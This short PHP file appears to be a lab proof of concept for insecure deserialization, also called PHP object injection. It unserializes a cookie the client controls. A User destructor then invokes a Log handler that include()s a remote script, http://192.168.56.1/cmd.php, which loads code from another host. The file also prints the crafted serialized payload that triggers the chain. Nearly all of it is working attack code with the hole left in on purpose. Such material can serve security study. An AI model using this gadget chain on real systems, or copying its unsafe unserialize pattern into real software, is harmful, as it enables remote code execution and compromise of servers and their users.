<?php
  class Log {
    //private $type_log = "http://192.168.56.1/cmd";
    private $type_log = 'http://192.168.56.1/cmd.php';

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
     // echo "LOG: " . $val;
    }
  }
?>

<?php

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      //$this->wel = new Welcome();
      $this->wel = new Log();
    }

    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }

?>

<?php

	if(!isset($_COOKIE['user'])) {
		setcookie("user", base64_encode(serialize(new User('sk4'))));
	} else {
		unserialize(base64_decode($_COOKIE['user']));
	}
	echo "This is a beta test for new cookie handler\n";

	echo urlencode(base64_encode(serialize(new User('CK'))));
?>
